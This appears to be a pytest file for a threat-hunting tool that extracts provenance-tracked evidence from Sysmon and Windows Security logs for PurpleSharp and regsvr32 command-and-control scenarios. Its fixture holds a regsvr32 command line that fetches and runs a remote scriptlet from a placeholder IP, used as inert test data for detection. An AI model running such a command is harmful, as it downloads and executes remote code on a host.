"""Focused provenance regressions for corrected, versioned canonical slices."""

from __future__ import annotations

import copy
import hashlib
import json
from pathlib import Path

import pytest

from scripts.build_reviewed_slice_artifacts import write_artifacts
from threat_hunting.evidence.purplesharp_ad import extract_purplesharp_evidence
from threat_hunting.evidence.regsvr32_c2 import extract_regsvr32_evidence
from threat_hunting.ground_truth.schema import GroundTruthValidationError, validate_ground_truth_document


def write_events(path: Path, events: list[dict]) -> Path:
    path.write_text("".join(json.dumps(event) + "\n" for event in events), encoding="utf-8")
    return path


def process_event(*, binary="PurpleSharp.exe", ref="jsonl:line:19", event_id="1", host="fixture-workstation.local", pid="7520", guid="fixture-process-guid") -> dict:
    return {
        "source_file": "fixture.json", "raw_record_ref": ref, "event_id": event_id,
        "provider": "Microsoft-Windows-Sysmon" if event_id == "1" else "Microsoft-Windows-Security-Auditing",
        "timestamp": "2020-10-22T08:29:53.801000Z", "host": host,
        "process_name": "C:\\Tools\\" + binary, "process_id": pid, "process_guid": guid,
        "parent_process_name": "C:\\Windows\\cmd.exe" if binary == "PurpleSharp.exe" else "C:\\Windows\\powershell.exe",
        "parent_process_id": "5776", "command_line": "PurpleSharp.exe /t T1110.003,T1558.003,T1135,T1021.006" if binary == "PurpleSharp.exe" else "regsvr32.exe /n /i:http://192.0.2.7:8444/fixture.sct scrobj.dll",
    }


@pytest.fixture
def purple_input(tmp_path):
    security = process_event(event_id="4688", ref="jsonl:line:16", pid="0x1d60", guid=None)
    security["timestamp"] = "2020-10-22T08:29:53.799000Z"
    return write_events(tmp_path / "canonical.jsonl", [security, process_event(), {"event_id": "4625", "target_user": "unattributed-account"}])


def test_purple_preserves_host_refs_and_missing_fields_without_attributing_accounts(purple_input):
    before = purple_input.read_bytes()
    doc = extract_purplesharp_evidence(purple_input)
    assert doc["schema_version"] == "scenario-ground-truth/v3"
    assert {entity["attributes"]["host"] for entity in doc["entities"]} == {"fixture-workstation.local"}
    assert len(doc["entities"]) == 2
    assert [item["raw_record_ref"] for item in doc["evidence"][0]["observations"]] == ["jsonl:line:16", "jsonl:line:19"]
    observation = doc["facts"][0]["attributes"]["source_observations"][0]
    assert observation["field_origin"] == "canonical-event/v2"
    original = observation["canonical_fields"]
    assert original["host"] == "fixture-workstation.local"
    assert original["source_ip"] is None
    assert original["process_id"] == "0x1d60"
    assert doc["input_provenance"][0]["sha256"] == hashlib.sha256(before).hexdigest()
    assert doc["sigma_findings"] == []
    assert len(doc["mitre_assessments"]) == 4
    assert all(item["stix_id"] is None and item["evidence_support"] == "not_assessed" and item["status"] == "candidate" for item in doc["mitre_assessments"])
    assert doc["review"]["review_status"] == "pending_human_review"
    assert "Read all 3 canonical records" in doc["review"]["notes"][0]
    assert purple_input.read_bytes() == before


def test_regsvr_network_endpoint_is_observed_and_correlated_not_a_default(tmp_path):
    launch = process_event(binary="regsvr32.exe", ref="jsonl:line:97")
    other = {**launch, "event_id": "3", "raw_record_ref": "jsonl:line:98", "host": "other-host", "destination_ip": "192.0.2.99", "destination_port": 9999}
    network = {**launch, "event_id": "3", "raw_record_ref": "jsonl:line:1001", "destination_ip": "192.0.2.7", "destination_port": 8444}
    path = write_events(tmp_path / "regsvr.jsonl", [launch, other, network])
    before = path.read_bytes()
    doc = extract_regsvr32_evidence(path)
    assert doc["entities"][1]["attributes"]["host"] == "fixture-workstation.local"
    endpoint = doc["entities"][2]
    assert endpoint["name"] == "192.0.2.7:8444"
    assert endpoint["attributes"]["port"] == 8444
    assert endpoint["attributes"]["role"] == "observed_destination"
    assert doc["evidence"][1]["source_references"][0]["raw_record_ref"] == "jsonl:line:1001"
    assert "remain unverified" in doc["evidence"][1]["summary"]
    assert doc["sigma_findings"] == []
    assert len(doc["facts"]) == 2
    assert doc["facts"][1]["attributes"]["source_observations"][0]["canonical_fields"]["destination_ip"] == "192.0.2.7"
    assert path.read_bytes() == before


def test_extractor_fails_instead_of_fabricating_missing_evidence(tmp_path):
    path = write_events(tmp_path / "missing.jsonl", [{"event_id": "4625"}])
    with pytest.raises(ValueError, match="Missing Sysmon.*missing.jsonl"):
        extract_purplesharp_evidence(path)
    path = write_events(path, [process_event(binary="regsvr32.exe")])
    with pytest.raises(ValueError, match="Missing correlated.*missing.jsonl"):
        extract_regsvr32_evidence(path)


def test_extractor_reports_invalid_json_with_filename(tmp_path):
    path = tmp_path / "invalid.jsonl"
    path.write_text('{"event_id":', encoding="utf-8")
    with pytest.raises(ValueError, match="invalid.jsonl, canonical line 1"):
        extract_purplesharp_evidence(path)


def test_pid_reuse_does_not_merge_unrelated_process_creation(tmp_path):
    security = process_event(event_id="4688", ref="jsonl:line:2", guid=None)
    security["timestamp"] = "2020-10-22T06:29:53.801000Z"
    path = write_events(tmp_path / "reused.jsonl", [security, process_event()])
    doc = extract_purplesharp_evidence(path)
    assert len(doc["evidence"][0]["observations"]) == 1


@pytest.mark.parametrize("version", ["scenario-ground-truth/v1", "scenario-ground-truth/v2"])
def test_previous_schemas_still_reject_null_stix(purple_input, version):
    doc = extract_purplesharp_evidence(purple_input)
    doc["schema_version"] = version
    with pytest.raises(GroundTruthValidationError, match="stix_id"):
        validate_ground_truth_document(doc)


def test_v3_unresolved_mapping_cannot_claim_supported_behavior_or_placeholder(purple_input):
    doc = extract_purplesharp_evidence(purple_input)
    invalid = copy.deepcopy(doc)
    invalid["mitre_assessments"][0]["evidence_support"] = "supported_by_observed_behavior"
    with pytest.raises(GroundTruthValidationError, match="unresolved STIX provenance"):
        validate_ground_truth_document(invalid)
    invalid = copy.deepcopy(doc)
    invalid["mitre_assessments"][0]["stix_id"] = "attack-pattern--00000000-0000-0000-0000-000000001110"
    with pytest.raises(GroundTruthValidationError, match="placeholder"):
        validate_ground_truth_document(invalid)
    invalid = copy.deepcopy(doc)
    invalid["review"]["review_status"] = "confirmed"
    with pytest.raises(GroundTruthValidationError):
        validate_ground_truth_document(invalid)


def test_versioned_builder_validates_readback_and_refuses_overwrite(purple_input, tmp_path):
    doc = extract_purplesharp_evidence(purple_input)
    embedding = {"provider": "fixture", "model_id": "fixture", "model_revision": "a" * 40,
                 "dimension": 2, "distance_metric": "cosine", "normalization": "l2", "document_prefix": "passage: ", "query_prefix": "query: "}
    output = tmp_path / "new-version"
    result = write_artifacts(doc, output, embedding=embedding, embed_documents=lambda texts: [[1.0, 0.0] for _ in texts])
    hashes = {path.name: hashlib.sha256(path.read_bytes()).hexdigest() for path in output.glob("*.json")}
    assert result["sha256"] == hashes
    assert result["counts"]["chunks"] == result["counts"]["index_records"]
    with pytest.raises(FileExistsError, match="already exists"):
        write_artifacts(doc, output, embedding=embedding, embed_documents=lambda texts: [])
    assert hashes == {path.name: hashlib.sha256(path.read_bytes()).hexdigest() for path in output.glob("*.json")}
